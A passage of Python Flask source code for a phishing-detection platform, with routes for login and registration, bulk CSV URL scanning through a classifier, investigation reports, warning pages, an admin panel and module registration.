            investigation_store.put(inv_id, inv)
        return jsonify(sanitize_for_json(inv))
    except Exception as e:
        print(f"Error regenerating investigation: {e}")
        return jsonify({'error': 'Investigation generation error', 'details': str(e)}), 500


@app.route("/report", methods=["GET"])
def report_page():
    """Render the Full Threat Investigation Report page.
    Available before and after login without authentication blockers.
    """
    inv_id = request.args.get("id", "").strip()
    target_url = request.args.get("url", "").strip()
    target_domain = request.args.get("domain", "").strip()

    # Route specifically email investigations to investigation_report.html
    if inv_id.startswith("NS-EML-"):
        return render_template("investigation_report.html",
                               investigation_id=inv_id,
                               username=session.get("username", "Guest Analyst"),
                               role=session.get("role", "guest"))

    # All unified, URL, domain, webpage, and general investigations render full threat lens report
    return render_template("report.html",
                           investigation_id=inv_id,
                           target_url=target_url,
                           target_domain=target_domain,
                           username=session.get("username", "Guest Analyst"),
                           role=session.get("role", "guest"))


@app.route("/warning", methods=["GET"])
def warning_page():
    """Render the Plain-English End-User Interception & Warning Screen."""
    url_target = request.args.get("url", "").strip()
    threat = request.args.get("threat", "").strip()
    inv_id = request.args.get("id", "").strip()
    if not url_target or not threat:
        # Never render a warning for an invented target/threat.
        return redirect("/")
    return render_template("warning.html",
                           url=url_target,
                           threat=threat,
                           inv_id=inv_id)


# ── REGISTER ───────────────────────────────────────────────────────────────────

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        role = "user"
        conn   = get_db_connection()
        cursor = conn.cursor()
        try:
            if len(username.strip()) < 3 or len(password) < 8:
                conn.close()
                return render_template("register.html", error="Agent ID must be at least 3 characters and the access code at least 8 characters.")
            cursor.execute(
                "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                (username.strip(), generate_password_hash(password), role)
            )
            conn.commit()
        except sqlite3.IntegrityError:
            conn.close()
            return render_template("register.html", error="That Agent ID is already registered. Choose a different one.")
        finally:
            try:
                conn.close()
            except Exception:
                pass
        return redirect("/login")
    return render_template("register.html")

# ── LOGIN ──────────────────────────────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    conn   = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, role FROM users WHERE username=?", (username.strip(),))
    row = cursor.fetchone()
    user = None
    if row:
        stored = row[2] or ""
        if stored.startswith(("scrypt:", "pbkdf2:")):
            ok = check_password_hash(stored, password)
        else:
            # Legacy plaintext row from before hashing was introduced: compare in
            # constant time, then upgrade the row to a hash on successful login.
            ok = hmac.compare_digest(stored.encode(), password.encode())
            if ok:
                cursor.execute("UPDATE users SET password=? WHERE id=?", (generate_password_hash(password), row[0]))
                conn.commit()
        if ok:
            user = row
    conn.close()
    if user:
        session.clear()
        session["user_id"]  = user[0]
        session["username"] = user[1]
        session["role"]     = user[3]
        if user[3] == "admin":
            return redirect("/admin")
        return redirect("/dashboard")
    return render_template("login.html", error="Invalid Agent ID or Access Code. Please try again.")

# ── USER DASHBOARD ─────────────────────────────────────────────────────────────

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    user_id = session.get("user_id")
    conn   = get_db_connection()
    cursor = conn.cursor()
    if user_id:
        cursor.execute(
            "SELECT url, prediction, timestamp FROM logs WHERE user_id=? ORDER BY id DESC LIMIT 5",
            (user_id,)
        )
    else:
        cursor.execute(
            "SELECT url, prediction, timestamp FROM logs ORDER BY id DESC LIMIT 5"
        )
    recent_logs = cursor.fetchall()
    conn.close()
    return render_template("user_dashboard.html",
                           username=session.get("username", "Guest Analyst"),
                           role=session.get("role", "guest"),
                           recent_logs=recent_logs)

# ── BULK UPLOAD & ANALYSIS ────────────────────────────────────────────────────

def process_bulk_csv(file_storage, user_id=None):
    """Core logic to process a CSV file and return detailed multi-module metrics."""
    df = pd.read_csv(file_storage)
    if "url" not in df.columns:
        if "URL" in df.columns:
            df.rename(columns={"URL": "url"}, inplace=True)
        elif "Url" in df.columns:
            df.rename(columns={"Url": "url"}, inplace=True)
        else:
            df.rename(columns={df.columns[0]: "url"}, inplace=True)

    processed_results = []
    heuristics_count = 0
    rules_count = 0
    ml_count = 0

    conn   = get_db_connection() if user_id else None
    cursor = conn.cursor() if conn else None

    for _, row in df.iterrows():
        raw_url = str(row['url']).strip()
        if not raw_url or raw_url.lower() == 'nan':
            continue
        try:
            pred, prob = classify_url(raw_url)
            feat = extract_features(raw_url)
            intel = build_url_intelligence(raw_url, pred, prob, feat)

            is_rule = "rule match" in pred.lower()
            if is_rule:
                rules_count += 1
            else:
                ml_count += 1

            if (feat.get('url_length', 0) > 75 or feat.get('suspicious_word', 0) > 0
                    or feat.get('has_ip', 0) > 0 or feat.get('hyphen_count', 0) > 1):
                heuristics_count += 1

            method  = "Security Rule" if is_rule else "Random Forest ML"
            status  = "threat" if "phishing" in pred.lower() else "safe"
            prob_val = float(prob) if prob is not None else None

            item = {
                'url':        raw_url,
                'prediction': pred,
                'probability': prob_val,
                'method':     method,
                'status':     status,
                'features':   {k: v for k, v in feat.items() if isinstance(v, (int, float, str))},
                'intel':      intel,
            }
            processed_results.append(item)

            if cursor and user_id:
                cursor.execute(
                    "INSERT INTO logs (user_id, url, prediction, timestamp, risk_level, risk_score) VALUES (?, ?, ?, ?, ?, ?)",
                    (user_id, raw_url, pred, datetime.now(), intel.get('composite_level', 'LOW'), intel.get('composite_risk', 0))
                )
        except Exception as e:
            processed_results.append({
                'url':        raw_url,
                'prediction': f"Error: {str(e)}",
                'probability': None,
                'method':     'Error Handler',
                'status':     'error',
                'features':   {},
                'intel':      {},
            })

    if conn:
        conn.commit()
        conn.close()

    total     = len(processed_results)
    threats   = sum(1 for r in processed_results if r['status'] == 'threat')
    legit     = sum(1 for r in processed_results if r['status'] == 'safe')
    risk_rate = round((threats / total * 100), 1) if total > 0 else 0
    probs     = [r['probability'] for r in processed_results if r['probability'] is not None]
    avg_conf  = round(sum(probs) / len(probs), 1) if probs else 0

    summary = {
        'total':          total,
        'threats':        threats,
        'legitimate':     legit,
        'risk_rate':      risk_rate,
        'avg_confidence': avg_conf,
    }
    modules = {
        'heuristics_flagged': heuristics_count,
        'rules_flagged':      rules_count,
        'ml_inferred':        ml_count,
        'fusion_verdicts':    total,
    }
    return processed_results, summary, modules


@app.route("/api/bulk-scan", methods=["POST"])
def api_bulk_scan():
    if "file" not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    file = request.files["file"]
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    try:
        results, summary, modules = process_bulk_csv(file, session.get("user_id"))
        return jsonify({
            'success':  True,
            'filename': file.filename,
            'summary':  summary,
            'modules':  modules,
            'results':  results,
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': f'Failed to process file: {str(e)}'}), 500


@app.route("/upload", methods=["GET", "POST"])
def upload():
    results = summary = modules = None
    if request.method == "POST":
        if "file" in request.files and request.files["file"].filename != "":
            file = request.files["file"]
            try:
                results, summary, modules = process_bulk_csv(file, session.get("user_id"))
                if (request.is_json
                        or request.headers.get("Accept") == "application/json"
                        or request.headers.get("X-Requested-With") == "XMLHttpRequest"):
                    return jsonify({
                        'success':  True,
                        'filename': file.filename,
                        'summary':  summary,
                        'modules':  modules,
                        'results':  results,
                    })
            except Exception as e:
                print(f"Error processing file: {e}")
    return render_template("upload.html",
                           username=session.get("username", "Guest Analyst"),
                           role=session.get("role", "guest"),
                           results=results,
                           summary=summary,
                           modules=modules)

# ── ADMIN PANEL ────────────────────────────────────────────────────────────────

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if "role" not in session or session["role"] != "admin":
        return redirect("/")
    conn   = get_db_connection()
    cursor = conn.cursor()
    prediction = None
    if request.method == "POST":
        url = request.form.get("url")
        if url:
            prediction, _ = classify_url(url)
            cursor.execute(
                "INSERT INTO logs (user_id, url, prediction, timestamp) VALUES (?, ?, ?, ?)",
                (session["user_id"], url, prediction, datetime.now())
            )
            conn.commit()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM logs")
    total_logs = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM logs WHERE prediction='Phishing'")
    phishing_count = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM logs WHERE prediction='Legitimate'")
    legitimate_count = cursor.fetchone()[0]
    conn.close()
    return render_template("admin_dashboard.html",
                           username=session.get("username"),
                           total_users=total_users,
                           total_logs=total_logs,
                           phishing_count=phishing_count,
                           legitimate_count=legitimate_count,
                           result=prediction)

# ── LOGOUT ─────────────────────────────────────────────────────────────────────

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

# ── MODULE 4: Email Intelligence, capability registry, persistent investigations ──
try:
    try:
        from backend.email_routes import register_email_routes
    except ImportError:
        from email_routes import register_email_routes
    _email_hooks.update(register_email_routes(app, {
        "get_db_connection": get_db_connection, "classify_url": classify_url, "extract_features": extract_features,
        "build_url_intelligence": build_url_intelligence, "domain_cache": domain_cache, "analyze_domain": analyze_domain,
        "evaluate_domain_rules": evaluate_domain_rules, "safe_fetch_webpage": safe_fetch_webpage,
        "analyze_webpage": analyze_webpage, "evaluate_webpage_rules": evaluate_webpage_rules, "FETCH_SUCCESS": FETCH_SUCCESS,
        "investigation_store": investigation_store, "sanitize_for_json": sanitize_for_json,
    }))
except Exception as _e:
    import traceback
    traceback.print_exc()
    print(f"Email Intelligence module could not be registered: {_e}")

# ── MODULE 5: AI Investigation Agent + QR Intelligence ──
try:
    try:
        from backend.module5_routes import register_module5_routes
    except ImportError:
        from module5_routes import register_module5_routes
    m5_res = register_module5_routes(app, {
        "get_db_connection": get_db_connection,
        "classify_url": classify_url,
        "extract_features": extract_features,
        "build_url_intelligence": build_url_intelligence,
        "analyze_domain": analyze_domain,
        "evaluate_domain_rules": evaluate_domain_rules,
        "extract_domain_features": extract_domain_features,
        "features_to_vector": features_to_vector,
        "domain_model": domain_model,
        "domain_model_schema": domain_model_schema,
        "domain_cache": domain_cache,
        "normalize_domain_input": normalize_domain_input,
        "is_safe_target": is_safe_target,
        "safe_fetch_webpage_hybrid": safe_fetch_webpage_hybrid,
        "analyze_webpage": analyze_webpage,
        "evaluate_webpage_rules": evaluate_webpage_rules,
        "evaluate_identity_consistency": evaluate_identity_consistency,
        "FETCH_SUCCESS": FETCH_SUCCESS,
        "fuse_threat_layers": fuse_threat_layers,
        "investigation_store": investigation_store,
        "sanitize_for_json": sanitize_for_json,
    })
    print("Module 5 (AI Investigation Agent + QR Intelligence) registered successfully.")
except Exception as _e5:
    import traceback
    traceback.print_exc()
    print(f"Module 5 could not be registered: {_e5}")

# ── Chrome Extension & Institutional Verification Routes ──
try:
    try:
        from backend.extension_routes import register_extension_routes
    except ImportError:
        from extension_routes import register_extension_routes
    register_extension_routes(app, {
        "get_db_connection": get_db_connection,
        "classify_url": classify_url,
        "extract_features": extract_features,
        "build_url_intelligence": build_url_intelligence,
        "analyze_domain": analyze_domain,
        "evaluate_domain_rules": evaluate_domain_rules,
        "domain_cache": domain_cache,
        "is_safe_target": is_safe_target,
        "safe_fetch_webpage_hybrid": safe_fetch_webpage_hybrid,
        "safe_fetch_webpage": safe_fetch_webpage,
        "analyze_webpage": analyze_webpage,
        "evaluate_webpage_rules": evaluate_webpage_rules,
        "FETCH_SUCCESS": FETCH_SUCCESS,
        "investigation_store": investigation_store,
        "sanitize_for_json": sanitize_for_json,
    })
    print("Chrome Extension & Institutional Verification routes registered successfully.")
except Exception as _ext_err:
    import traceback
    traceback.print_exc()
    print(f"Extension routes could not be registered: {_ext_err}")

# ── Platform Routes: Modules 7 to 21 (Monitoring, Brand, Resilience, Audit, Analytics, Evidence, News) ──
try:
    try:
        from backend.platform_routes import register_platform_routes
    except ImportError:
        from platform_routes import register_platform_routes
    register_platform_routes(app, {
        "get_db_connection": get_db_connection,
        "project_root": project_root,
        "sanitize_for_json": sanitize_for_json,
        "extract_features": extract_features,
        "classify_url": classify_url,
        "evaluate_security_rules": evaluate_security_rules,
        "analyze_domain": analyze_domain,
        "safe_fetch_webpage_hybrid": safe_fetch_webpage_hybrid,
        "safe_fetch_webpage": safe_fetch_webpage,
        "analyze_webpage": analyze_webpage,
        "FETCH_SUCCESS": FETCH_SUCCESS,
        "investigation_agent": m5_res.get('agent') if 'm5_res' in locals() and isinstance(m5_res, dict) else None,
    })
    print("Master Platform routes (Modules 7-21) registered successfully.")
except Exception as _plat_err:
    import traceback
    traceback.print_exc()
    print(f"Platform routes could not be registered: {_plat_err}")

# ── Global CORS Handler for APIs ──
@app.after_request
def add_cors_headers(response):
    if request.path.startswith('/api/'):
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, PATCH, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With'
    return response

if __name__ == "__main__":
    app.run(debug=os.environ.get("FLASK_DEBUG") == "1")
